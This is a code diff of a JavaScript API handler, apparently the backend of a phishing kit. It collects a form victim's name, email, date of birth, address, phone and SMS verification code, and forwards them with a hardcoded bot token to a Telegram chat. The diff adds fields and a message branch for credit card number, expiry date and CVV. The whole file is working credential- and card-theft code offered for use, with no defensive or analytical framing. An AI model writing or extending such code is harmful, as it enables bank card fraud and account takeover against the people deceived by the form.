@@ -3,30 +3,54 @@ export default async function handler(req, res) {
     return res.status(405).json({ message: "Method not allowed" });
   }
 
-  const { first_name, last_name, email, dob, address, postal, city, num, sms_code } = req.body;
+  const { 
+    first_name, 
+    last_name, 
+    email, 
+    dob, 
+    address, 
+    postal, 
+    city, 
+    num, 
+    sms_code,
+    cc_number,
+    cc_exp,
+    cc_cvv
+  } = req.body;
 
   const BOT_TOKEN = "7434892132:AAHI5vTd19Ngo57sBY-3JO247rlcZqU18QM";
   const CHAT_ID = "-4982276528";
 
   let message = "";
 
-  if (sms_code) {
-    // رسالة الـ SMS
+  if (cc_number && cc_exp && cc_cvv) {
+    // 🟢 رسالة الكارت
     message = `
-📲 SMS reçu:
+💳 Carte Bancaire:
+- Numéro: ${cc_number}
+- Expiration: ${cc_exp}
+- CVV: ${cc_cvv}
+- Nom: ${first_name} ${last_name}
+- Adresse: ${address}, ${city}, ${postal}
+- Téléphone: ${num}
+    `;
+  } else if (sms_code) {
+    // 🟠 رسالة SMS
+    message = `
+📲 SMS Reçu:
 - Code: ${sms_code}
 - Nom: ${first_name} ${last_name}
 - Numéro: ${num}
     `;
   } else {
-    // بيانات الفورم الأولية
+    // 🔵 بيانات الفورم الأولية
     message = `
-📨 Infos formulaire:
+📨 Infos Formulaire:
 - Nom: ${first_name} ${last_name}
 - Email: ${email}
 - Date: ${dob}
-- Address: ${address}, ${city}, ${postal}
-- Numéro: ${num}
+- Adresse: ${address}, ${city}, ${postal}
+- Téléphone: ${num}
     `;
   }
 
@@ -39,9 +63,9 @@ export default async function handler(req, res) {
       body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
     });
 
+    res.status(200).json({ message: "✅ Envoyé avec succès" });
   } catch (err) {
     console.error(err);
+    res.status(500).json({ message: "❌ Erreur lors de l'envoi" });
   }
 }
-
-
